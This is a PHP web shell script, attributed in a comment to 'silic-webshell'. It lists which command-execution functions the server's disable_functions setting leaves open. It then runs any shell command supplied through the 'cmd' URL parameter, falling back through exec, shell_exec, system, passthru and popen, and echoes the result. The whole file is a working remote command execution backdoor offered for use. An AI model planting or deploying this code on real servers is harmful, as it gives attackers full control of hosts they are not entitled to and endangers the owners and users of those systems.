<?php
//from silic-webshell
//usage: http://lemon.love:8081/bypass.php?cmd=ipconfig

msg("php enable_functions  enumeration script");
$func_arr=array('dl','exec','system','passthru','popen','proc_open','pcntl_exec','shell_exec','mail','symlink','putenv');
$dis_func_arr = explode(",",get_cfg_var("disable_functions"));

if($dis_func_arr[0]){
 foreach ($func_arr as $func) {
  	 if(!in_array($func,$dis_func_arr)){
  	 	 msg("Function: <strong><a href=http://www.php.net/manual/zh/function.$func.php  target=blank > $func </strong> </a> enable",1);
  	 }
 } 
}else{
  msg("disable_functions  none !!!",1);
}
function msg($text,$type=0){
	
	$def="[*]";
	$color="green";
	if($type ==1){ 
		
		$def="[+]" ; 
		$color="red";
	}else if ($type==-1){
		 
		$def="[-]";
	}
	echo "<font color=$color>$def $text</font> <br>";
}

function Exec_Run($cmd) {
	$res = '';
	if (function_exists('exec')) {
		@exec($cmd, $res);
		$res = join("\n", $res);
	} elseif (function_exists('shell_exec')) {
		$res = @shell_exec($cmd);
	} elseif (function_exists('system')) {
		@ob_start();@system($cmd);
		$res = @ob_get_contents();
		@ob_end_clean();
	} elseif (function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$res = @ob_get_contents();
		@ob_end_clean();
	} elseif (@is_resource($f = @popen($cmd, "r"))) {
		$res = '';
		while (!@feof($f)) {$res .= @fread($f, 1024);}
		@pclose($f);
	}
	return $res;
}
function Exec_g() {
	$res = '回显';
	$cmd = 'whoami';
	if (!empty($_GET['cmd'])) {
		$cmd = $_GET['cmd'];
	}
	$res = Exec_Run($cmd);
	print <<<END
	<pre>
	command >> <span style="color:red">{$cmd}</span>
	{$res}
	</pre>
END;
}
Exec_g();
